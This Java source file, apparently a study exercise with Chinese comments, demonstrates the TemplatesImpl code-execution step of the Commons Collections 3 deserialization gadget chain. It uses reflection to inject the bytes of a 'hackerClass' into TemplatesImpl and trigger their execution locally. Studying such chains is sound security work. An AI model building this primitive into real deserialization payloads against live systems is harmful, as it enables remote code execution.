package cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javafx.scene.shape.Path;
import toolkit.Seriliazation;

import javax.xml.transform.TransformerConfigurationException;
import java.io.File;
import java.io.FileDescriptor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3Chain {
    private static String bytecodePath = "target/classes/cc3/hackerClass.class";

    public static void main(String[] args) throws Exception {
        cc3();
        suspend();
    }

    /**
     * cc3 动态类加载 - 代码执行
     * cc1, cc6 是命令执行
     *
     * Gaget Chain:
     *  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()
     *      -> getTransletInstance()
     *          -> defineTransletClasses() -> newInstance() 对象初始化
     *              -> defineClass(final byte[] b)
     *                  -> defineClass(String name, byte[] b, int off, int len)
     */
    public static void cc3() throws Exception {
        // 需要满足的约束：_name, _bytecodes, _tfactory
        TemplatesImpl templates = new TemplatesImpl();
        Class clazz_templatesImpl = templates.getClass();

        // 赋值
        Field fieldName = clazz_templatesImpl.getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templates, "aaa");;

        Field fieldBytecodes = clazz_templatesImpl.getDeclaredField("_bytecodes");
        fieldBytecodes.setAccessible(true);
        byte[][] bytecodes = new byte[][]{
                Files.readAllBytes(Paths.get(bytecodePath))
        };
        fieldBytecodes.set(templates,  bytecodes);

        Field fieldTfactory = clazz_templatesImpl.getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templates, new TransformerFactoryImpl());

//        Field fieldAuxClasses = clazz_templatesImpl.getDeclaredField("_auxClasses");
//        fieldAuxClasses.setAccessible(true);
//        fieldAuxClasses.set(templates, new HashMap<String, Class<?>>());
//
//        Field fieldTransletIndex = clazz_templatesImpl.getDeclaredField("_transletIndex");
//        fieldTransletIndex.setAccessible(true);
//        fieldTransletIndex.set(templates, 0);

        templates.newTransformer();
    }

    private static void suspend() {
        try {
            // 让主线程进入长时间休眠，实现挂起
            Thread.sleep(Long.MAX_VALUE);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
